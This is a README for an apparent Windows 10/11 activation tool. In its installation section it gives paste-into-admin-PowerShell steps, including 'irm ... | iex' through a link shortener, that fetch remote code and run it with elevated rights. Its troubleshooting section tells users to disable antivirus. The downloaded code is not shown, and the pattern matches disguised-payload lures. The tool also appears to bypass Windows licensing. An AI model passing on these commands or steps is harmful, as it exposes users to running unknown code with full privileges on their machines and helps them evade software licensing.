# Windows Activation Assistant

A lightweight utility for Windows 10/11 activation management.

> ⚠️ **Disclaimer**: This tool is for educational and testing purposes only. Please ensure you have appropriate licensing for your Windows installation.

## 🌟 Features

- **Automated Activation**: Streamlined process for Windows 10 and 11
- **Multiple Methods**: Choose from PowerShell, manual batch, or script execution
- **User-Friendly**: Simple interface with clear instructions
- **Error Handling**: Built-in validation and error recovery
- **Logging**: Detailed activity logging for troubleshooting

## 📋 Prerequisites

- Windows 10 or Windows 11
- Administrative privileges
- Internet connection
- PowerShell 5.1 or higher

## 🚀 Installation Methods

### 1. PowerShell One-Line Installation

1. Press `Win + X` and select "Windows PowerShell (Admin)"
2. Copy and paste one of the following commands:

```powershell
# Full installation
irm "https://raw.githubusercontent.com/gelogrammer/Windows-10-and-11-Activator/refs/heads/main/windows.bat" -OutFile "windows.bat"; Start-Process -FilePath "windows.bat" -Verb RunAs

# Quick installation
irm https://dub.sh/activator | iex
```

### 2. Manual Batch File Installation

1. Download `windows.bat` from the releases page
2. Right-click the file and select "Run as administrator"
3. Follow the on-screen prompts

### 3. PowerShell Script Installation

1. Download `win.ps1` from the releases page
2. Right-click the file and select "Run with PowerShell"
3. Follow the on-screen prompts

## 📝 Usage Instructions

1. Choose your preferred installation method
2. Allow administrative privileges when prompted
3. Wait for the activation process to complete
4. Restart your system when prompted

## 🔍 Verification

To verify activation status:
1. Open Command Prompt as administrator
2. Run `slmgr /xpr`
3. Check the displayed activation status

## 📸 Screenshots

![Activation Process](https://github.com/user-attachments/assets/ce853d71-7d34-409c-a809-1a64508c14f3)
![Successful Activation](https://github.com/user-attachments/assets/b898383e-433d-412a-bb63-fa6ae9553155)

## ⚠️ Troubleshooting

If you encounter issues:
1. Ensure you have administrative privileges
2. Check your internet connection
3. Temporarily disable antivirus software
4. Review the log file at `%TEMP%\system_management.log`

## 📄 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## 🤝 Contributing

Contributions are welcome! Please feel free to submit a Pull Request.

## 📞 Support

- Create an issue in this repository
- Review existing issues for solutions
- Check the [FAQ](FAQ.md) section

---

⭐ If you find this tool helpful, please consider giving it a star!
